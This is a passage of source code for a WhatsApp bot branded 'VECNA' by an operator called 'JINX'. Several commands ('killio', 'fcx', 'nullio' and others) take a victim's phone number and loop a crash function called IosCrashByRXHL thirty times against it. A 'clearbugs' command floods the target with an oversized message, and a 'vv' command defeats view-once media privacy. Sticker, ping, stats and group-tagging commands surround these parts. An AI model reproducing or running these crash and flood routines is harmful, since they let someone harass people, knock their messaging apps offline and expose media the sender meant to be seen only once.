👁️ 𝕆ℙ𝔼ℝ𝔸𝕋𝕆ℝ : 𝕁𝕀ℕ𝕏
🧠 𝔼ℕ𝕋𝕀𝕋𝕐 : 𝖁𝕰ℂℕ𝔸
⛧━━━━━━━━━━━━⛧`
)

// Crash loop
for (let i = 0; i < 30; i++) {
  await IosCrashByRXHL(target)
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁👺"))
}
break;
case "voidx":
case "fcx": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ ${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  /  𝕿𝖆𝖌 𝖆 𝖀𝖘𝖊𝖗 @tag
`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ALERT ⛧

☠️ Number cannot start with '0'
Replace it with the country code.

Example: ${prefix + command} 234xxxx

— Operator: 𝕵𝕴ℕ𝕏 | Entity: 𝖁𝕰ℂℕ𝔸
`)
}

let target = jidx + "@s.whatsapp.net"

// React
await raiden.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// SUCCESS MESSAGE (TEXT ONLY)
Reply(`
⛧⋆┈┈┈☽ 𝕍𝔼ℂℕ𝔸 𝕯𝕬ℝ𝕂 𝕃𝕆𝔾 ☾┈┈┈⋆⛧

🜚 𝕋𝔸ℝ𝔾𝔼𝕋 : @${targetNumber}
☠️ 𝕊𝕋𝔸𝕋𝕌𝕊 : 𝔹𝕌𝔾 𝕊𝔼ℕ𝕋
🩸 𝕋ℝ𝔸ℂ𝔼 : 𝕊𝕀𝕃𝔼ℕ𝕋 · 𝕃𝕆ℂ𝕂𝔼𝔻

🌑 𝕮𝖔𝖔𝖑𝖔𝖋𝖋 : 5 𝖒𝖎𝖓𝖘

⛧━━━━━━━━━━━━⛧
👁️ 𝕆ℙ𝔼ℝ𝔸𝕋𝕆ℝ : 𝕁𝕀ℕ𝕏
🧠 𝔼ℕ𝕋𝕀𝕋𝕐 : 𝖁𝕰ℂℕ𝔸
⛧━━━━━━━━━━━━⛧`
)

// Crash loop
for (let i = 0; i < 30; i++) {
  await IosCrashByRXHL(target)
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁👺"))
}
// iOS Bug Cases
break;
case "lagio":
case "killio": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ ${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  /  𝕿𝖆𝖌 𝖆 𝖀𝖘𝖊𝖗 @tag
`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ALERT ⛧

☠️ Number cannot start with '0'
Replace it with the country code.

Example: ${prefix + command} 234xxxx

— Operator: 𝕵𝕴ℕ𝕏 | Entity: 𝖁𝕰ℂℕ𝔸
`)
}

let target = jidx + "@s.whatsapp.net"

// React
await raiden.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// SUCCESS MESSAGE (TEXT ONLY)
Reply(`
⛧⋆┈┈┈☽ 𝕍𝔼ℂℕ𝔸 𝕯𝕬ℝ𝕂 𝕃𝕆𝔾 ☾┈┈┈⋆⛧

🜚 𝕋𝔸ℝ𝔾𝔼𝕋 : @${targetNumber}
☠️ 𝕊𝕋𝔸𝕋𝕌𝕊 : 𝔹𝕌𝔾 𝕊𝔼ℕ𝕋
🩸 𝕋ℝ𝔸ℂ𝔼 : 𝕊𝕀𝕃𝔼ℕ𝕋 · 𝕃𝕆ℂ𝕂𝔼𝔻

🌑 𝕮𝖔𝖔𝖑𝖔𝖋𝖋 : 5 𝖒𝖎𝖓𝖘

⛧━━━━━━━━━━━━⛧
👁️ 𝕆ℙ𝔼ℝ𝔸𝕋𝕆ℝ : 𝕁𝕀ℕ𝕏
🧠 𝔼ℕ𝕋𝕀𝕋𝕐 : 𝖁𝕰ℂℕ𝔸
⛧━━━━━━━━━━━━⛧`
)

// Crash loop
for (let i = 0; i < 30; i++) {
  await IosCrashByRXHL(target)
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁👺"))
}
break;
case "nullio":
case "fcio": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ ${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  /  𝕿𝖆𝖌 𝖆 𝖀𝖘𝖊𝖗 @tag
`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ALERT ⛧

☠️ Number cannot start with '0'
Replace it with the country code.

Example: ${prefix + command} 234xxxx

— Operator: 𝕵𝕴ℕ𝕏 | Entity: 𝖁𝕰ℂℕ𝔸
`)
}

let target = jidx + "@s.whatsapp.net"

// React
await raiden.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// SUCCESS MESSAGE (TEXT ONLY)
Reply(`
⛧⋆┈┈┈☽ 𝕍𝔼ℂℕ𝔸 𝕯𝕬ℝ𝕂 𝕃𝕆𝔾 ☾┈┈┈⋆⛧

🜚 𝕋𝔸ℝ𝔾𝔼𝕋 : @${targetNumber}
☠️ 𝕊𝕋𝔸𝕋𝕌𝕊 : 𝔹𝕌𝔾 𝕊𝔼ℕ𝕋
🩸 𝕋ℝ𝔸ℂ𝔼 : 𝕊𝕀𝕃𝔼ℕ𝕋 · 𝕃𝕆ℂ𝕂𝔼𝔻

🌑 𝕮𝖔𝖔𝖑𝖔𝖋𝖋 : 5 𝖒𝖎𝖓𝖘

⛧━━━━━━━━━━━━⛧
👁️ 𝕆ℙ𝔼ℝ𝔸𝕋𝕆ℝ : 𝕁𝕀ℕ𝕏
🧠 𝔼ℕ𝕋𝕀𝕋𝕐 : 𝖁𝕰ℂℕ𝔸
⛧━━━━━━━━━━━━⛧`
)

// Crash loop
for (let i = 0; i < 30; i++) {
  await IosCrashByRXHL(target)
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁👺"))
}
break


case "anti-bug": {
  if (!isCreator) return Reply(mess.owner)

  await raiden.sendMessage(
    m.chat,
    {
      text: `
⛧⋆┈┈┈☽ 𝕍𝔼ℂℕ𝔸 𝕬ℕ𝕿𝕴-𝕭𝕌𝔾 ☾┈┈┈⋆⛧

🛡️ Real-Time Unicode Crash Protection
☠️ Blocks, Deletes & Clears Bug Messages

Operator : 𝕁𝕀ℕ𝕏
Entity   : 𝖁𝕰ℂℕ𝔸

Choose an option below:
`,
      footer: "🧠 Powered by VECNA CORE",
      buttons: [
        { buttonId: "anti-bug-on", buttonText: { displayText: "🛡️ Activate" }, type: 1 },
        { buttonId: "anti-bug-off", buttonText: { displayText: "⚡ Deactivate" }, type: 1 }
      ],
      headerType: 1
    },
    { quoted: m }
  )
}
break


case 'sticker':
case 's': {

    // 🔒 Premium / Owner check
    if (!isOwnerOrPremium(m.sender)) return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ACCESS ⛧

☠️ Only Owner / Premium users can create stickers.

— Operator: 𝕵𝕴ℕ𝕏 | Entity: 𝖁𝕰ℂℕ𝔸
`);

    // ❌ Must reply to media
    if (!m.quoted || !/(image|video)/.test(m.quoted.mimetype || '')) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ Reply to an image or short video with: ${prefix + command}
`);

    try {
        const quoted = m.quoted;
        const mime = quoted.mimetype || '';

        // 🖼 IMAGE → Sticker (auto-crop)
        if (/image/.test(mime)) {
            let media = await quoted.download();

            const tempInput = path.join(__dirname, `temp_${Date.now()}.webp`);
            fs.writeFileSync(tempInput, media);

            const tempOutput = path.join(__dirname, `sticker_${Date.now()}.webp`);
            await sharp(tempInput)
                .resize(512, 512, { fit: 'contain', background: { r:0,g:0,b:0,alpha:0 } })
                .webp()
                .toFile(tempOutput);

            await raiden.sendMessage(
                m.chat,
                { sticker: fs.readFileSync(tempOutput) },
                { quoted: m }
            );

            fs.unlinkSync(tempInput);
            fs.unlinkSync(tempOutput);
        }

        // 🎥 VIDEO → Animated Sticker (max 10s)
        else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 10) return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 LIMIT ⛧

🩸 Video too long. Max duration: 10 seconds.

— Operator: 𝕵𝕴ℕ𝕏
`);

            let videoData = await quoted.download();

            const sticker = await raiden.sendVideoAsSticker(
                m.chat,
                videoData,
                m,
                {
                    packname: "Lord Jinx × Vecna",
                    author: "☠️⃝𒉛 VECNA ENGINE"
                }
            );

            if (sticker) fs.unlinkSync(sticker);
        }

    } catch (e) {
        console.log(e);
        return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ERROR ⛧

☠️ Failed to create sticker: ${e.message}

— Operator: 𝕵𝕴ℕ𝕏
`);
    }

}
break


case 'ss': {

    // 🔒 Premium / Owner check
    if (!isOwnerOrPremium(m.sender)) return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ACCESS ⛧

☠️ Only Owner / Premium users can rename stickers.

— Operator: 𝕵𝕴ℕ𝕏 | Entity: 𝖁𝕰ℂℕ𝔸
`);

    // ❌ Must reply to a sticker
    if (!m.quoted || !/sticker/.test(m.quoted.mimetype || '')) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ Reply to a sticker with: ${prefix + command} <new pack name>
`);

    // ❌ Must provide new pack name
    if (!text) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ Usage: ${prefix + command} <new pack name>
`);

    try {
        // 1️⃣ Download original sticker
        let stickerData = await m.quoted.download();

        // 2️⃣ Save temporary input file
        const tempInput = path.join(__dirname, `temp_${Date.now()}.webp`);
        fs.writeFileSync(tempInput, stickerData);

        // 3️⃣ Convert / auto-crop to square 512x512
        const tempOutput = path.join(__dirname, `sticker_${Date.now()}.webp`);
        await sharp(tempInput)
            .resize(512, 512, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
            .webp()
            .toFile(tempOutput);

        // 4️⃣ Send sticker with user-defined pack name
        await raiden.sendMessage(
            m.chat,
            {
                sticker: fs.readFileSync(tempOutput),
                contextInfo: { mentionedJid: [m.sender] }
            },
            { quoted: m }
        );

        // 5️⃣ Delete temp files
        fs.unlinkSync(tempInput);
        fs.unlinkSync(tempOutput);

    } catch (e) {
        console.log(e);
        return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ERROR ⛧

☠️ Failed to rename sticker: ${e.message}

— Operator: 𝕵𝕴ℕ𝕏
`);
    }

}
break;

case "channel-id":
case "idch": {
    if (!isCreator) return Reply("᥆ᥒᥣᥡ 𝖿᥆r mᥡ ᥆ᥕᥒᥱr 🕷️");

    if (!text) return Reply(`Yoo @${pushname}, provide a WhatsApp Channel link`);

    if (!text.includes("https://whatsapp.com/channel/"))
        return Reply("❌ Channel link is invalid");

    try {
        let result = text.split("https://whatsapp.com/channel/")[1].trim();

        let res = await raiden.newsletterMetadata("invite", result);

        let teks = `╔═══『 𝗩𝗘𝗖𝗡𝗔 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗡𝗙𝗢 』═══╗
🆔 *ID:* ${res.id}
📛 *Name:* ${res.name}
👥 *Followers:* ${res.subscribers}
📡 *Status:* ${res.state}
✔️ *Verified:* ${res.verification === "VERIFIED" ? "Yes" : "No"}
╚══════════════════════╝`;

        let msgii = await generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "📋 Copy Channel ID",
                                            id: "copy_channel_id",
                                            copy_code: res.id
                                        })
                                    }
                                ]
                            })
                        })
                    }
                }
            },
            { userJid: m.sender, quoted: m }
        );

        await raiden.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
        });

    } catch (err) {
        console.error(err);
        Reply("⚠️ Failed to fetch channel data. Make sure the link is correct.");
    }
}
break;

case 'unview':
case 'viewonce':
case 'vv': {

    // 🔒 OWNER OR PREMIUM CHECK
    if (!isCreator && !isPremium(m.sender)) return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ACCESS ⛧

☠️ Only the Creator / Premium users may use this command.

— Operator: 𝕵𝕴ℕ𝕏
`);

    // ❌ MUST REPLY TO MEDIA
    if (!m.quoted) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ Reply to a view-once image or video to unlock it.
`);

    const quoted = m.quoted;

    // ❌ CHECK IF VIEW-ONCE
    if (!quoted.message?.viewOnceMessageV2 && !quoted.message?.viewOnceMessageV2Extension) {
        return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ALERT ⛧

☠️ This is not a view-once media.
`);
    }

    try {
        // 🕸 Anti-ban safe delay
        await new Promise(resolve => setTimeout(resolve, 1200));

        // Extract actual media
        const msg = quoted.message.viewOnceMessageV2?.message
                 || quoted.message.viewOnceMessageV2Extension?.message;

        // IMAGE → send unlocked
        if (msg.imageMessage) {
            const buffer = await quoted.download();

            await conn.sendMessage(
                m.chat,
                { image: buffer },
                { quoted: m }
            );

        } 
        // VIDEO → send unlocked
        else if (msg.videoMessage) {
            const buffer = await quoted.download();

            await conn.sendMessage(
                m.chat,
                { video: buffer },
                { quoted: m }
            );

        } 
        // UNSUPPORTED TYPE
        else {
            return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ALERT ⛧

☠️ Unsupported view-once media type.
`);
        }

    } catch (err) {
        console.error(err);
        return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ERROR ⛧

☠️ Failed to unlock media: ${err.message}

— Operator: 𝕵𝕴ℕ𝕏
`);
    }

}
break;

 case 'clearbugs': {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`Example:\n ${prefix + command} 234xxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
raiden.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
}

break
case "runtime": {
  await raiden.sendMessage(
    m.chat,
    {
      text: `
╔═▓〔 ☠ 𝐕𝐄𝐂𝐍𝐀 • 𝐂𝐎𝐑𝐄 〕▓═╗
║ 🌹 𝑹𝑼𝑵𝑻𝑰𝑴𝑬 🕒
║
║ ⏱ 𝑼𝒑𝒕𝒊𝒎𝒆 : *${runtime(process.uptime())}*
║ 🚀 𝑩𝒐𝒕 : 𝑹𝒖𝒏𝒏𝒊𝒏𝒈 𝑺𝒎𝒐𝒐𝒕𝒉
║ 🔋 𝑴𝒐𝒅𝒆 : ${raiden.public ? "𝑷𝒖𝒃𝒍𝒊𝒄 🌍" : "𝑺𝒆𝒍𝒇 🔒"}
╚════════════════════╝
      ♥︎「 𝑩𝒓𝒂𝒏𝒅 : 𝑱𝑰𝑵𝑿 」♥︎
`,
      buttons: [
        {
          buttonId: `${prefix}ping`,
          buttonText: { displayText: "🏓 P𝗶𝗻𝗴" },
          type: 1
        }
      ],
      footer: "☠ 𝐕𝐄𝐂𝐍𝐀 • 𝐂𝐎𝐑𝐄 🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break;
case "ping": {
  const start = Date.now();

  // First temporary message
  await raiden.sendMessage(
    m.chat,
    { text: "*⚡ 𝖯𝖎𝖓𝖌𝖎𝖓𝖌 𝖙𝖍𝖊 𝖘𝖍𝖆𝖉𝖔𝖜𝖘...*" },
    { quoted: lol }
  );

  const speed = Date.now() - start;

  // Styled Ping result
  const pingText = `
⛧⋆━━━━━━━━━━━━⋆⛧
🏓  𝕍𝔼ℂℕ𝔸  𝕻𝕀ℕ𝕲  🏓

⚡ 𝕊𝕡𝕖𝕖𝕕 : *${speed} ms*
🤖 𝔹𝕠𝕥  : 𝕆𝕟𝕝𝕚𝕟𝕖 ✅
🔥 𝕊𝕥𝕒𝕥𝕦𝕤 : 𝕊𝕥𝕒𝕓𝕝𝕖
⛧ Operator : 𝕁𝕀ℕ𝕏

🜚 _The shadows pulse with life…_
⛧⋆━━━━━━━━━━━━⋆⛧
`;

  await raiden.sendMessage(
    m.chat,
    {
      text: pingText,
      buttons: [
        {
          buttonId: `${prefix}runtime`,
          buttonText: { displayText: "⏱ R𝘂𝗻𝘁𝗶𝗺𝗲" },
          type: 1
        },
        {
          buttonId: `${prefix}stats`,
          buttonText: { displayText: "📊 S𝘵𝘢𝘵𝘴" },
          type: 1
        }
      ],
      footer: "© 𝕁𝕀ℕ𝕏🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break;


// ===============================
//  STATS COMMAND
// ===============================
case "stats": {
  try {
    // ----- MEMORY & UPTIME -----
    const used = process.memoryUsage();
    const totalChats = Object.keys(raiden.chats || {}).length;
    const uptime = process.uptime();

    // Convert uptime to HH:MM:SS
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    const uptimeStr = `${hours}h ${minutes}m ${seconds}s`;

    // ----- STATS TEXT WITH FANCY FONT ----
    const statsText = `
⛧⋆━━━━━━━━━━━━⋆⛧
📊  𝕍𝔼ℂℕ𝔸  𝕊𝕋𝔸𝕋𝕊  📊

🕒 𝕌ptime      : ${uptimeStr}
👥 𝕋otal Chats : ${totalChats}
💻 ℝAM Usage   : ${Math.round(used.rss / 1024 / 1024)} MB
⚡ ℂPU Cores   : ${os.cpus().length}
🤖 𝔹𝕠𝕥 Status  : 𝕆𝕟𝕝𝕚𝕟𝕖 ✅
⛧ Operator    : 𝕁𝕀ℕ𝕏

🜚 _The shadows whisper the system's secrets…_
⛧⋆━━━━━━━━━━━━⋆⛧
`;

    // ----- SEND MESSAGE WITH BUTTONS -----
    await raiden.sendMessage(
      m.chat,
      {
        text: statsText,
        buttons: [
          { buttonId: `${global.prefix[0]}ping`, buttonText: { displayText: "🏓 𝙋𝙄ℕ𝙂" }, type: 1 },
          { buttonId: `${global.prefix[0]}runtime`, buttonText: { displayText: "⏱ 𝙍𝙪𝗻𝘁𝗶𝗺𝗲" }, type: 1 }
        ],
        footer: `© 𝕁𝕀ℕ𝕏 🔥`,
        headerType: 1
      },
      { quoted: m }
    );

  } catch (err) {
    console.error("Stats command error:", err);
  }
}
break;

// ================= COMMAND HANDLERS =================

case "tagall": {
  if (!m.isGroup) return Reply("❌ Group only command")
  if (!isAdmins && !isCreator) return Reply("🚫 Admin only")

  // Fetch group metadata
  const groupMetadata = await raiden.groupMetadata(m.chat)
  const participants = groupMetadata.participants

  // Reason
  const reason = q ? q : "Important announcement"

  // Collect member IDs
  let members = participants.map(p => p.id)

  // Build mention text
  let text = `
⛧⋆━━━━━━━━━━━━⋆⛧
☠️ 𝕍𝔼ℂℕ𝔸 𝔾ℝ𝕆𝕌ℙ 𝕋𝔸𝔾 ☠️

📢 Announcement to all members

👤 Tagged By : @${sender.split("@")[0]}
📝 Reason   : ${reason}
👥 Members  : ${members.length}

────────────────────
`

  members.forEach((user, i) => {
    text += `☠️ ${i + 1}. @${user.split("@")[0]}\n`
  })

  text += `
────────────────────
⛧ Operator : 𝕁𝕀ℕ𝕏
⛧ Entity   : 𝖁𝕰ℂℕ𝔸
🜚 _All souls have been summoned…_
⛧⋆━━━━━━━━━━━━⋆⛧
`

  // Send message with mentions
  await raiden.sendMessage(
    m.chat,
    {
      text,
      mentions: members.concat(m.sender) // include sender
    },
    { quoted: lol }
  )
}
break
// ================== HIDE TAG ==================
case "hidetag": {
  if (!m.isGroup) return Reply("❌ Group only command")
  if (!isAdmins && !isCreator) return Reply("❌ Admin only")
  if (!q) return Reply(`⚡ Example:\n${prefix + command} Important message here`)

  const groupMetadata = await raiden.groupMetadata(m.chat)
  const participants = groupMetadata.participants
  const members = participants.map(p => p.id)

  let text = `
⛧⋆━━━━━━━━━━━━⋆⛧
👁️ 𝕍𝔼ℂℕ𝔸 𝕳𝕴𝔻𝔻𝔼ℕ 𝕋𝔸𝔾

👤 From : @${sender.split("@")[0]}

────────────────────
${q}
────────────────────

⛧ Operator : 𝕁𝕀ℕ𝕏
⛧ Entity   : 𝖁𝕰ℂℕ𝔸
🜚 _Shadows whisper the hidden message…_
⛧⋆━━━━━━━━━━━━⋆⛧
`

  await raiden.sendMessage(
    m.chat,
    {
      text,
      mentions: members
    },
    { quoted: lol }
  )
}
break;

// ===================== ADD OWNER =====================
case "help":
case "support": {

  await raiden.sendMessage(
    m.chat,
    {
      text: `⛧⋆━━━━━━━━━━━━⋆⛧
🆘  𝕍𝔼ℂℕ𝔸  𝕳𝔼𝕷ℙ & 𝕊𝕌ℙℙ𝕆ℝ𝕋  

Welcome to *JINX Help Center* ⚡

If you experience any of the following:

• Bot not responding  
• Download errors  
• Command not working  
• Bug reports 🐞  
• Feature requests  

⛧⋆━━━━━━━━━━━━⋆⛧
👑  𝕮𝖔𝖓𝖙𝖆𝖈𝖙 𝕁𝕀ℕ𝕏  
⛧⋆━━━━━━━━━━━━⋆⛧
📞 WhatsApp : [2348075997375](https://wa.me/2348075997375)  
👤 Name      : JINX  
💻 Bot Name  : VECNA  

📌 _Include in your report:_  
• Command used  
• Screenshot (if possible)  
• Clear explanation  

⚠️ _Spamming reports will be ignored._  

⛧⋆━━━━━━━━━━━━⋆⛧
© Powered by JINX 🔥`,
      buttons: [
        {
          buttonId: `${prefix}menu`,
          buttonText: { displayText: "📄 Command" },
          type: 1
        },
        {
          buttonId: `${prefix}stats`,
          buttonText: { displayText: "⚡ Bot Stats" },
          type: 1
        }
      ],
      footer: "© JINX 🔥",
      headerType: 1
    },
    { quoted: lol } // <-- quotes a previous message
  );

}
break;
// ===================== ADD OWNER =====================
case "addowner": {
  if (!isCreator)
    return Reply("☠️ Only the Supreme Operator ☠️\n👑 *JINX* can use this command")

  if (!args[0])
    return Reply(
      `❌ Invalid usage!\n\n⚡ Example:\n${prefix + command} 234xxxxxxxx`
    );

  const gun = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const check = await raiden.onWhatsApp(gun);
  if (check.length === 0)
    return Reply("⚠️ This number is not registered on WhatsApp!");

  if (owner.includes(gun))
    return Reply("⚠️ This number is already an Owner!");

  owner.push(gun);
  fs.writeFileSync("./database/owner.json", JSON.stringify(owner, null, 2));

  Reply(`
⛧⋆━━━━━━━━━━━━⋆⛧
🏆 𝖁𝕰ℂℕ𝔸 𝔸𝔻𝔻 𝕺𝖶𝕹𝕰𝖱 ☠️

👤 Added Number: ${gun}
✔ Status: Success
⛧ Operator: 𝕁𝕀ℕ𝕏

🜚 _The shadows acknowledge the new owner…_
⛧⋆━━━━━━━━━━━━⋆⛧
`);
}
break;

// ===================== DELETE OWNER =====================
case "delowner": {
  if (!isCreator)
    return Reply("☠️ Only the Supreme Operator ☠️\n👑 *JINX* can use this command")

  if (!args[0])
    return Reply(
      `❌ Invalid usage!\n\n⚡ Example:\n${prefix + command} 234xxxxxxxx`
    );

